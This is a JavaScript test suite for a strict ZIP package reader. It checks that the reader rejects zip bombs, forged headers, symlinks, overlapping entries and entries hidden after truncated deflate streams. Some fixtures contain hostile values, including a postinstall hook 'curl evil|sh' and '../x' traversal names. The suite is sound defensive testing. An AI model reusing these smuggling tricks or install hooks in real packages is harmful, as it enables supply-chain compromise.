import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { tmpHome } from './helpers.js';
import { buildZip, extraField } from './fake/zip.js';
import {
  MAX_PACKAGE_BYTES, MAX_PACKAGE_ENTRIES, MAX_PACKAGE_FILES, PackageError, crc32, readEntry, readFiles, readZip,
} from '../src/pkg/zip.js';

const SKILL = { name: 'SKILL.md', data: '---\nname: demo\ndescription: d\n---\nbody\n' };
const notes = Buffer.from('just some notes\n');

function readAll(buf, hooks) {
  const { entries, files } = readZip(buf, hooks);
  return { entries, contents: new Map([...readFiles(buf, files)].map(([e, d]) => [e.name, d.toString()])) };
}

function rejects(buf, reason, msg) {
  assert.throws(() => readAll(buf), (err) => {
    assert.ok(err instanceof PackageError, `${msg}: ${err}`);
    assert.equal(err.reason, reason, `${msg}: ${err.detail}`);
    return true;
  }, msg);
}

// The server's fixture: a complete local header + data for a package.json with an install hook.
function hiddenEntry() {
  const z = buildZip([{ name: 'package.json', data: '{"scripts":{"postinstall":"curl evil|sh"}}' }]);
  return z.subarray(0, z.indexOf('PK\x01\x02'));
}

test('crc32 matches the IEEE polynomial', () => {
  assert.equal(crc32(Buffer.from('123456789')), 0xcbf43926);
  assert.equal(crc32(Buffer.alloc(0)), 0);
});

test('a clean archive is read: store, deflate, descriptors, directories, allowed extra fields', () => {
  const ut = extraField(0x5455, [3, 1, 2, 3, 4, 5, 6, 7, 8]);
  const ux = extraField(0x7875, [1, 4, 0xe8, 3, 0, 0, 4, 0xe8, 3, 0, 0]);
  const ntfs = extraField(0x000a, Buffer.alloc(32));
  const z = buildZip([
    { ...SKILL, localExtra: Buffer.concat([ut, ux]), centralExtra: Buffer.concat([extraField(0x5455, [3, 1, 2, 3, 4]), ux]) },
    { name: 'lib/' },
    { name: 'lib/a.js', data: 'x', deflate: true, centralExtra: ntfs, localExtra: ntfs },
    { name: 'lib/d.txt', data: notes, deflate: true, flags: 0x8, descriptor: true },
    { name: 'lib/e.txt', data: notes, deflate: true, flags: 0x8, descriptor: true, descSig: false },
    { name: 'empty.txt', data: '' },
    { name: 'utf8.txt', data: notes, flags: 0x800 },
    { name: 'fat.txt', data: 'f', madeBy: 20, externalAttrs: 0x20 },
    { name: 'fatdir/', madeBy: 11 << 8, externalAttrs: 0x10 },
  ], { comment: 'archive comment' });
  const { entries, contents } = readAll(z);
  assert.equal(entries.length, 9);
  assert.deepEqual(entries.filter((e) => e.isDir).map((e) => e.name), ['lib/', 'fatdir/']);
  assert.equal(contents.size, 7);
  assert.equal(contents.get('lib/a.js'), 'x');
  assert.equal(contents.get('lib/d.txt'), notes.toString());
  assert.equal(contents.get('lib/e.txt'), notes.toString());
  assert.equal(contents.get('empty.txt'), '');
});

test('names are returned raw for later path checks; onEntry sees every entry first', () => {
  const names = ['../x', '/abs', 'a\\b', 'C:x', 'a//b', 'café.md', 'a\u0000b'];
  const z = buildZip([SKILL, ...names.map((name) => ({ name, data: 'x' }))]);
  const seen = [];
  const { contents } = readAll(z, { onEntry: (e) => seen.push(e.name) });
  assert.deepEqual(seen, ['SKILL.md', ...names]);
  for (const n of names) assert.equal(contents.get(n), 'x');
  const latin = buildZip([{ name: Buffer.from([0x66, 0xe9]).toString('latin1'), data: 'x' }]);
  assert.ok(readZip(latin).entries[0].nameBytes.length > 0);
  assert.throws(() => readZip(z, { onEntry: (e) => { if (e.name === '../x') throw new PackageError('path_traversal', ''); } }),
    (err) => err.reason === 'path_traversal');
});

test('an archive built by Info-ZIP zip -r is accepted', (t) => {
  if (spawnSync('zip', ['-v']).status !== 0) return t.skip('zip not installed');
  const dir = tmpHome();
  fs.mkdirSync(path.join(dir, 's', 'scripts'), { recursive: true });
  fs.writeFileSync(path.join(dir, 's', 'SKILL.md'), SKILL.data);
  fs.writeFileSync(path.join(dir, 's', 'scripts', 'run.sh'), 'echo hi\n'.repeat(50));
  const out = spawnSync('zip', ['-qr', path.join(dir, 'p.zip'), '.'], { cwd: path.join(dir, 's') });
  assert.equal(out.status, 0, String(out.stderr));
  const { contents } = readAll(fs.readFileSync(path.join(dir, 'p.zip')));
  assert.equal(contents.get('scripts/run.sh'), 'echo hi\n'.repeat(50));
});

test('size caps: zip bytes, declared size, boundaries', () => {
  rejects(Buffer.alloc(MAX_PACKAGE_BYTES + 1), 'too_large', 'zip > 20 MiB');
  const fill = MAX_PACKAGE_BYTES - SKILL.data.length;
  const exact = buildZip([SKILL, { name: 'zeros', data: Buffer.alloc(fill), deflate: true }]);
  assert.equal(readAll(exact).contents.get('zeros').length, fill);
  rejects(buildZip([SKILL, { name: 'zeros', data: Buffer.alloc(fill + 1), deflate: true }]), 'too_large', '20 MiB + 1');
  rejects(buildZip([SKILL, { name: 'big', data: 'x', declSize: 0xffffffff, payload: 'x' }]), 'too_large', 'huge declared');
});

test('zip bombs: output is capped at the declared size', () => {
  const big = Buffer.alloc(MAX_PACKAGE_BYTES + 1024);
  const bomb = buildZip([SKILL, { name: 'zeros', data: big, deflate: true }]);
  assert.ok(bomb.length < MAX_PACKAGE_BYTES);
  rejects(bomb, 'too_large', 'bomb');
  rejects(buildZip([SKILL, { name: 'zeros', data: big, deflate: true, declSize: 10 }]), 'archive_invalid', 'lying size');
  const z = buildZip([{ name: 'zeros', data: big, deflate: true, declSize: 10 }]);
  const { entries } = readZip(z, {});
  assert.throws(() => readEntry(z, entries[0], 5), (err) => err.reason === 'too_large');
});

test('entry and file counts', () => {
  const files = (n) => Array.from({ length: n }, (_, i) => ({ name: `f/${String(i).padStart(3, '0')}.txt`, data: 'x' }));
  assert.equal(readZip(buildZip([SKILL, ...files(MAX_PACKAGE_FILES - 1)])).files.length, MAX_PACKAGE_FILES);
  rejects(buildZip([SKILL, ...files(MAX_PACKAGE_FILES)]), 'too_many_files', '201 files');
  const dirs = (n) => Array.from({ length: n }, (_, i) => ({ name: `d${i}/` }));
  assert.equal(readZip(buildZip([SKILL, ...dirs(MAX_PACKAGE_ENTRIES - 1)])).entries.length, MAX_PACKAGE_ENTRIES);
  rejects(buildZip([SKILL, ...dirs(MAX_PACKAGE_ENTRIES)]), 'too_many_files', '1001 entries');
});

test('layout: EOCD position, leading/trailing data, zip64, multi-disk, central directory bounds', () => {
  const ok = [SKILL, { name: 'a.txt', data: 'x' }];
  const locator = Buffer.concat([Buffer.from('PK\x06\x07'), Buffer.alloc(16)]);
  const cases = {
    'empty': Buffer.alloc(0),
    'not a zip': Buffer.from('hello'),
    'no end record': Buffer.alloc(100),
    'prepended data': buildZip(ok, { prefix: '#!/bin/sh\nexit 0\n' }),
    'trailing data': buildZip(ok, { suffix: 'junk' }),
    'comment length short': buildZip(ok, { comment: 'abc', commentLen: 2 }),
    'comment length long': buildZip(ok, { comment: 'abc', commentLen: 4 }),
    'end record inside comment': buildZip(ok, { comment: Buffer.concat([Buffer.from('PK\x05\x06'), Buffer.alloc(18)]) }),
    'zip64 offset': buildZip(ok, { eocd: { cdOff: 0xffffffff } }),
    'zip64 size': buildZip(ok, { eocd: { cdSize: 0xffffffff } }),
    'zip64 count': buildZip(ok, { eocd: { nTotal: 0xffff } }),
    'zip64 locator': buildZip([SKILL, { name: 'a.txt', data: 'x', centralComment: locator }]),
    'zip64 extra': buildZip([SKILL, { name: 'a.txt', data: 'x', localExtra: extraField(0x0001, Buffer.alloc(16)) }]),
    'multi-disk': buildZip(ok, { eocd: { disk: 1 } }),
    'central on other disk': buildZip(ok, { eocd: { cdDisk: 1 } }),
    'disk counts differ': buildZip(ok, { eocd: { nDisk: 1, nTotal: 2 } }),
    'count too high': buildZip(ok, { eocd: { nTotal: 3 } }),
    'count too low': buildZip(ok, { eocd: { nTotal: 1 } }),
    'central tail bytes': buildZip(ok, { centralTail: 'xx' }),
    'gap before central directory': buildZip(ok, { gap: 'xx' }),
  };
  for (const [name, z] of Object.entries(cases)) rejects(z, 'archive_invalid', name);
  const z = buildZip(ok);
  const cd = z.indexOf('PK\x01\x02', z.indexOf('a.txt') + 6);
  z.writeUInt32LE(0xffffffff, cd + 20);
  rejects(z, 'archive_invalid', 'zip64 central compressed size');
  // Last central record's comment length runs past the directory into the end record.
  for (const len of [1, 21]) {
    const c = buildZip(ok);
    c.writeUInt16LE(len, c.lastIndexOf('PK\x01\x02') + 32);
    rejects(c, 'archive_invalid', `central comment crosses the end record by ${len}`);
  }
});

test('entry features: encryption, methods, data descriptors on Store', () => {
  const cases = {
    'encrypted': { name: 'e', data: 'x', flags: 1 },
    'encrypted in local header only': { name: 'e', data: 'x', localFlags: 1 },
    'bzip2 label, readable deflate data': { name: 'b', data: notes, deflate: true, method: 12 },
    'method 9 label, readable deflate data': { name: 'b', data: notes, deflate: true, method: 9 },
    'unknown method, stored data': { name: 'b', data: notes, method: 99 },
    'stored with descriptor': { name: 'n', data: 'PK\x07\x08 fake\n', flags: 0x8, descriptor: true },
    'stored, 0x8 only in local header': { name: 'n', data: notes, localFlags: 0x8, descriptor: true },
    'flag 0x800 only in local header': { name: 'n', data: notes, localFlags: 0x800 },
    'local method differs': { name: 'n', data: notes, localMethod: 8 },
    'local name differs': { name: 'ok.txt', localName: '../x', data: 'x' },
    'local size smaller': { name: 'a.txt', data: '0123456789', localSize: 4 },
    'local crc differs': { name: 'a.txt', data: 'x', localCRC: 1 },
    'descriptor size differs': { name: 'n', data: notes, deflate: true, flags: 0x8, descriptor: true, descUSize: 99 },
    'descriptor plus local sizes': { name: 'n', data: notes, deflate: true, flags: 0x8 },
    'crc mismatch in both headers': { name: 'a.txt', data: 'x', crc: 0x1234 },
    'crc zero in both headers': { name: 'a.txt', data: 'x', crc: 0 },
    'stored size differs': { name: 'a.txt', data: 'xx', declSize: 1 },
    'deflate ends early': { name: 'n', data: notes, deflate: true, deflateTail: Buffer.concat([Buffer.from('PK\x07\x08'), Buffer.alloc(12), hiddenEntry()]) },
    'deflate ends early with descriptor': {
      name: 'n', data: notes, deflate: true, flags: 0x8, descriptor: true,
      deflateTail: Buffer.concat([Buffer.from('PK\x07\x08'), Buffer.alloc(12), hiddenEntry()]),
    },
    'deflate truncated': { name: 'n', data: notes, payload: Buffer.from([0x0a, 0x0b]), method: 8 },
    'deflate corrupt': { name: 'n', data: notes, payload: Buffer.from([0xff, 0xff, 0xff]), method: 8 },
    'deflate empty payload': { name: 'n', data: '', payload: Buffer.alloc(0), method: 8 },
    'deflate yields less': { name: 'n', data: notes, deflate: true, declSize: notes.length + 1 },
  };
  for (const [name, e] of Object.entries(cases)) rejects(buildZip([SKILL, e]), 'archive_invalid', name);
  for (const method of [9, 12, 99]) {
    assert.throws(() => readZip(buildZip([SKILL, { name: 'b', data: notes, deflate: true, method }])),
      (err) => err.reason === 'archive_invalid' && /compression method/.test(err.detail), `method ${method}`);
  }
});

test('extra fields: strict allowlist, local and central', () => {
  const up = extraField(0x7075, Buffer.concat([Buffer.from([1, 0, 0, 0, 0]), Buffer.from('package.json')]));
  const hook = '{"scripts":{"postinstall":"echo pwned"}}';
  const ut = extraField(0x5455, [1, 0, 0, 0, 0]);
  const cases = {
    'unicode path (both)': { localExtra: up, centralExtra: up },
    'unicode path (local)': { localExtra: up },
    'unicode path (central)': { centralExtra: up },
    'unicode comment': { centralExtra: extraField(0x6375, [1, 0, 0, 0, 0, 0x78]) },
    'overrun': { centralExtra: [0x55, 0x54, 9, 0, 1] },
    'trailing bytes': { localExtra: Buffer.concat([ut, Buffer.from([0, 0])]) },
    'duplicate tag': { localExtra: Buffer.concat([ut, ut]) },
    'unknown tag': { localExtra: extraField(0xd935, [4, 0]) },
  };
  for (const [name, x] of Object.entries(cases)) {
    rejects(buildZip([SKILL, { name: 'notes.json', data: hook, ...x }]), 'archive_invalid', name);
  }
});

test('links: special Unix file types under any host, shared data', () => {
  const types = { symlink: 0o120777, fifo: 0o010644, char: 0o020644, block: 0o060644, socket: 0o140755, unknown: 0o030644 };
  for (const host of [0, 2, 3, 5, 11, 16, 19]) {
    const madeBy = (host << 8) | 20;
    for (const [tn, unixMode] of Object.entries(types)) {
      rejects(buildZip([SKILL, { name: 'creds', data: '/etc/hostname', unixMode, madeBy }]), 'link', `${host}/${tn}`);
    }
    readAll(buildZip([{ ...SKILL, madeBy }, { name: 'lib/', madeBy }, { name: 'lib/a.js', data: 'x', madeBy, unixMode: 0 }]));
  }
  rejects(buildZip([SKILL, { name: 'a', data: 'x' }], { alias: [['b', 'a']] }), 'link', 'shared data');
  rejects(buildZip([SKILL, { name: 'lib', data: 'x', unixMode: 0o040755, madeBy: (11 << 8) | 20 }]), 'archive_invalid', 'dir type on file');
  rejects(buildZip([SKILL, { name: 'lib/', unixMode: 0o100644 }]), 'archive_invalid', 'file type on dir');
  rejects(buildZip([SKILL, { name: 'lib', data: 'x', externalAttrs: 0x10, madeBy: 20 }]), 'archive_invalid', 'msdos dir attr on file');
  readAll(buildZip([SKILL, { name: 'lib', data: 'x', externalAttrs: 0x10, madeBy: (2 << 8) | 20 }]));
});

test('overlapping entries and misplaced local headers', () => {
  const inner = buildZip([{ name: 'evil.sh', data: 'echo pwned' }]);
  const innerLocal = inner.subarray(0, inner.indexOf('PK\x01\x02'));
  const z = buildZip([SKILL, { name: 'carrier.bin', data: innerLocal }]);
  const carrierData = z.indexOf(innerLocal);
  const overlap = buildZip([SKILL, { name: 'carrier.bin', data: innerLocal }, { name: 'evil.sh', data: 'echo pwned', centralOffset: carrierData }]);
  rejects(overlap, 'archive_invalid', 'entry inside another entry');
  rejects(buildZip([SKILL, { name: 'a', data: 'x', centralOffset: 3 }]), 'archive_invalid', 'no local header');
  rejects(buildZip([SKILL, { name: 'a', data: 'x', centralOffset: 0xfffff }]), 'archive_invalid', 'offset past end');
});

test('directory entries carry no data', () => {
  const cases = {
    'stored, 2 bytes': { name: 'lib/', payload: [0, 0] },
    'deflate, empty stream': { name: 'lib/', deflate: true },
    'deflate, 0 bytes': { name: 'lib/', method: 8 },
    'declares uncompressed': { name: 'lib/', declSize: 5 },
    'crc32 not 0': { name: 'lib/', crc: 0x1234 },
    'local header has 2 bytes': { name: 'lib/', localSize: 2 },
  };
  for (const [name, e] of Object.entries(cases)) {
    rejects(buildZip([SKILL, e, { name: 'lib/a.js', data: 'a' }]), 'archive_invalid', name);
  }
});

test('error messages never carry names from the package', () => {
  try {
    readAll(buildZip([SKILL, { name: 'secret-name', data: 'x', unixMode: 0o120777 }]));
    assert.fail('accepted');
  } catch (err) {
    assert.equal(err.message, 'package unsafe: link');
    assert.match(err.detail, /secret-name/);
  }
});

// Each hook throws its own reason, so the reported reason shows which check ran first.
const hookReasons = {
  onEntry: 'path_traversal', onChecked: 'invalid_path', onCentral: 'forbidden_path', onCounted: 'npm_dependencies',
};
function firstReason(z, hooks) {
  const opts = {};
  for (const h of hooks) opts[h] = () => { throw new PackageError(hookReasons[h], h); };
  try {
    readZip(z, opts);
  } catch (err) {
    assert.ok(err instanceof PackageError, String(err));
    return err.reason;
  }
  return 'ok';
}

test('check order when several rules are violated', () => {
  const files = (n) => Array.from({ length: n }, (_, i) => ({ name: `f/${i}.txt`, data: 'x' }));
  // The faulty entry comes first so per-entry hooks have not yet fired for a clean one.
  const encrypted = buildZip([{ name: 'e', data: 'x', flags: 1 }, SKILL]);
  const dirData = buildZip([{ name: 'lib/', payload: [0, 0] }, SKILL]);
  const tooMany = buildZip([SKILL, ...files(MAX_PACKAGE_FILES)]);
  const declared = buildZip([SKILL, { name: 'big', data: 'x', declSize: MAX_PACKAGE_BYTES, payload: 'x' }]);
  const declaredBadLocal = buildZip([SKILL, { name: 'big', data: 'x', declSize: MAX_PACKAGE_BYTES, payload: 'x', localCRC: 1 }]);
  const dirs = (n) => Array.from({ length: n }, (_, i) => ({ name: `d${i}/`, flags: 1 }));
  const cases = [
    ['entry count before onEntry', buildZip([SKILL, ...dirs(MAX_PACKAGE_ENTRIES)]), ['onEntry'], 'too_many_files'],
    ['onEntry before entry checks', encrypted, ['onEntry', 'onChecked'], 'path_traversal'],
    ['entry checks before onChecked', encrypted, ['onChecked', 'onCentral'], 'archive_invalid'],
    ['onChecked before directory data', dirData, ['onChecked'], 'invalid_path'],
    ['directory data before onCentral', dirData, ['onCentral'], 'archive_invalid'],
    ['onCentral before file count', tooMany, ['onCentral', 'onCounted'], 'forbidden_path'],
    ['file count before onCounted', tooMany, ['onCounted'], 'too_many_files'],
    ['onCounted before declared size', declared, ['onCounted'], 'npm_dependencies'],
    ['declared size before local headers', declaredBadLocal, [], 'too_large'],
    ['entry checks before a later entry', buildZip([SKILL, { name: 'e', data: 'x', flags: 1 }, { name: 'b', data: 'x', method: 9 }]), [], 'archive_invalid'],
  ];
  for (const [name, z, hooks, want] of cases) assert.equal(firstReason(z, hooks), want, name);
  const order = [];
  readZip(buildZip([SKILL, { name: 'lib/' }]), {
    onEntry: (e) => order.push(`entry ${e.name}`), onChecked: (e) => order.push(`checked ${e.name}`),
    onCentral: () => order.push('central'), onCounted: () => order.push('counted'),
  });
  assert.deepEqual(order, ['entry SKILL.md', 'checked SKILL.md', 'entry lib/', 'checked lib/', 'central', 'counted']);
});

test('readZip rejects a non-Buffer', () => {
  assert.throws(() => readZip('PK\x05\x06'), TypeError);
});
